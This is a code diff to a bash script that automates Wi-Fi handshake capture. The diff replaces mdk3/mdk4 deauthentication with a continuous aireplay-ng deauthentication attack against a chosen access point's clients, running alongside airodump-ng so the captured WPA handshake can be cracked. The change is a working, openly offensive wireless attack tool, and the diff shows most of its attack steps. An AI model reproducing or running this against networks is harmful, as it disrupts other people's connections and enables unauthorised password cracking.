@@ -4,14 +4,14 @@
 #Author:                QianSong
 #QQ:                    1725099638
 #Date:                  2022-09-13
-#FileName：             handshakes.sh
+#FileName：             handshakes_by_aireplay.sh
 #URL:                   https://github.com/QianSong1
 #Description：          The handshake wifi cap info script
 #Copyright (C):         QianSong 2022 All rights reserved
 #********************************************************************
 
 #ding yi var
-work_dir=$(dirname $(realpath $0))/temp
+work_dir=$(dirname $(realpath $0))/temp_aireplay
 result_dir=$(dirname $(realpath $0))/result
 
 #pan duan shi fou root yon hu yun xing
@@ -35,7 +35,7 @@ fi
 }
 
 #pan  duan  shi  fou  an zhuang  le  yi  lai  ruan  jian
-for i in mdk3 mdk4 airmon-ng airodump-ng xterm dos2unix cowpatty
+for i in mdk3 mdk4 airmon-ng airodump-ng xterm dos2unix cowpatty aireplay-ng
 do
 	type ${i} >/dev/null 2>&1
 	exit_code=$?
@@ -54,6 +54,9 @@ do
 				install_dependent_software aircrack-ng
 				;;
 			airodump-ng)
+				install_dependent_software aircrack-ng
+				;;
+			aireplay-ng)
 				install_dependent_software aircrack-ng
 				;;
 			xterm)
@@ -236,7 +239,7 @@ echo "starting scan wifi info into ${work_dir}/dump-01.csv...."
 #shu chu cao zuo ti shi info
 echo -e "\n"
 echo -e "\033[33m提示：当目标WiFi出现了，请手动关掉扫描窗口进入下一步！\033[0m"
-scan_all_ap $2
+scan_all_ap $1
 
 #xian shi sao  miao  jie  guo
 clear
@@ -306,11 +309,10 @@ else
 	done
 fi
 
-#kai qi gon ji mdk xterm
-echo  "${target_mac}" >${work_dir}/black_mac_list.txt
-echo  "" >>${work_dir}/black_mac_list.txt
-xterm -geometry "71+0+0" -bg "#000000" -fg "#FF0009" -title "Duan kai conn on ${target_mac}" -e $1 ${wlan_card} d -b ${work_dir}/black_mac_list.txt -c ${cur_channel} &
-echo $! >${work_dir}/mdk.pid
+#kai qi gon ji aireplay-ng xterm
+iw dev ${wlan_card} set channel ${cur_channel} >/dev/null 2>&1
+xterm -geometry "71+0+0" -bg "#000000" -fg "#FF0009" -title "Duan kai conn on ${target_mac}" -e aireplay-ng -0 0 -a ${target_mac} --ignore-negative-one ${wlan_card} &
+echo $! >${work_dir}/aireplay-ng.pid
 
 #shu chu cao zuo ti shi info
 echo -e "\n"
@@ -334,14 +336,14 @@ done
 sleep 3
 
 #guan bi gon ji xterm
-echo -e "\033[32mClose the mdk attack xterm...\033[0m"
-cat ${work_dir}/mdk.pid|xargs -i kill {} >/dev/null 2>&1
-target_pid=$(cat ${work_dir}/mdk.pid)
+echo -e "\033[32mClose the aireplay-ng attack xterm...\033[0m"
+cat ${work_dir}/aireplay-ng.pid|xargs -i kill {} >/dev/null 2>&1
+target_pid=$(cat ${work_dir}/aireplay-ng.pid)
 pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)     
 ppid_sum=$(ps -ef|awk "NR>1"'{print $3}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
 while [ ${pid_sum} -gt 0 ] || [ ${ppid_sum} -gt 0 ]
 do
-	target_pid=$(cat ${work_dir}/mdk.pid)
+	target_pid=$(cat ${work_dir}/aireplay-ng.pid)
 	pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)     
 	ppid_sum=$(ps -ef|awk "NR>1"'{print $3}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
 	sleep 1
@@ -396,28 +398,28 @@ do
 	read -p "Please select: " hand_type
 	case ${hand_type} in
 		1)
-			handshake_bga mdk3 bg
+			handshake_bga bg
 			handshake_check
 			exit_code=$?
 			while [ ${exit_code} -ne 0 ]
 			do
 				echo -e "\033[35mRestart handshake program and rechecking....\033[0m"
 				sleep 3
-				handshake_bga mdk3 bg
+				handshake_bga bg
 				handshake_check
 				exit_code=$?
 			done
 			display_cap_location
 			;;
 		2)
-			handshake_bga mdk4 a
+			handshake_bga a
 			handshake_check
 			exit_code=$?
 			while [ ${exit_code} -ne 0 ]
 			do
 				echo -e "\033[35Restart handshake program and rechecking....\033[0m"
 				sleep 3
-				handshake_bga mdk4 a
+				handshake_bga a
 				handshake_check
 				exit_code=$?
 			done
